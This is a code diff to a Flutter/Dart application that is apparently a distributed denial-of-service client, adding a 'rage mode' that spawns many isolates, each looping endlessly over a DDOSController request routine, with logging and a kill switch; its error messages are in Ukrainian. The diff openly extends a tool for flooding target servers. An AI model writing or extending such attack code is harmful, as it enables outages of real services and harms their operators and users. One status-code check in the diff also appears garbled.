@@ -1,3 +1,5 @@
+import 'dart:isolate';
+
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
 
@@ -41,6 +43,8 @@ class _HomeState extends State<Home> {
   final GlobalKey _btnKey = GlobalKey();
 
   List<DDOSInfo> logs = [];
+  List<ReceivePort> _ports = [];
+  List<Isolate> _isolates = [];
 
   void _checkForUpdate({bool init = false}) async {
     UpdateController updateController = UpdateController();
@@ -232,6 +236,7 @@ class _HomeState extends State<Home> {
       _clean();
       await start();
     } else {
+      _killThreadsTasks();
       setState(() {
         appStatus = AppStatus.stopped;
       });
@@ -247,8 +252,31 @@ class _HomeState extends State<Home> {
     });
   }
 
+  void _killThreadsTasks() {
+    if (_ports.isNotEmpty) {
+      for (var port in _ports) {
+        port.close();
+      }
+    }
+
+    for (Isolate i in _isolates) {
+      i.kill(priority: Isolate.immediate);
+    }
+  }
+
   /// start function, will create 5 tasks with last one on await
   Future<void> start() async {
+    switch (attackType) {
+      case AttackType.easy:
+        await _easyMode();
+        break;
+      case AttackType.rage:
+        await _rageMode();
+        break;
+    }
+  }
+
+  Future<void> _easyMode() async {
     // lets create 5 tasks
     _attack();
     await Future.delayed(const Duration(seconds: 1));
@@ -259,6 +287,64 @@ class _HomeState extends State<Home> {
     _attack();
     // ast one should be await
     await _attack();
+  }
+
+  Future<void> _rageMode() async {
+    for (int i = 0; i < maxThreads; ++i) {
+      ReceivePort receiverPort = ReceivePort("Thread #$i");
+      _ports.add(receiverPort);
+
+      _isolates.add(
+        await Isolate.spawn(
+          rageAttack,
+          receiverPort.sendPort,
+          debugName: "Thread #$i",
+        ),
+      );
+
+      receiverPort.listen((data) {
+        if (data is Map<String, dynamic>) {
+          String msg = data['msg'];
+          DDOSInfo info = data['info'];
+
+          switch (msg) {
+            case "stop":
+              _log(info);
+              break;
+            case "log":
+              _log(info);
+              break;
+            case "info":
+              setState(() {
+                if (info.responseCode >= 302 && info.responseCode >= 200) {
+                  appStatus = AppStatus.stopped;
+                  isError = true;
+                  _killThreadsTasks();
+                }
+                if (!msg.contains(info.msg)) {
+                  if (msg.isNotEmpty) msg += "\n";
+                  msg += info.msg;
+                }
+              });
+              break;
+          }
+
+          _log(info);
+        } else if (data is String) {
+          if (data == "stop") {
+            setState(() {
+              appStatus = AppStatus.stopped;
+              isError = true;
+              _killThreadsTasks();
+            });
+          }
+        }
+
+        if (logs.length > 100) {
+          logs.removeRange(0, 9);
+        }
+      });
+    }
   }
 
   /// main attack activity
@@ -332,5 +418,53 @@ class _HomeState extends State<Home> {
       curve: Curves.easeOut,
       duration: const Duration(milliseconds: 100),
     );
+  }
+}
+
+void rageAttack(SendPort port) async {
+  DDOSController controller = DDOSController();
+  // 1) init hosts and/or targets
+  await controller.init((info) {
+    port.send(
+      {
+        'msg': "info",
+        'info': info,
+      },
+    );
+
+    if (info.responseCode >= 302 && info.responseCode >= 200) {
+      port.send('stop');
+    }
+  });
+
+  // 3) if no errors:
+  //    - start main loop
+  while (true) {
+    try {
+      await controller.dance((_info) {
+        port.send(
+          {
+            'msg': "log",
+            'info': _info,
+          },
+        );
+      });
+    } catch (ex) {
+      // stop
+      port.send(
+        {
+          'msg': "stop",
+          'info': DDOSInfo(
+            msg: "Виник збій під час роботи\n"
+                "${ex.toString()}\n"
+                "Спробуйте ще раз, або скопіюйте помилку та надішліть мені.",
+            dateTime: DateTime.now(),
+            responseCode: 500,
+            status: DDOSStatus.error,
+          ),
+        },
+      );
+      return;
+    }
   }
 }
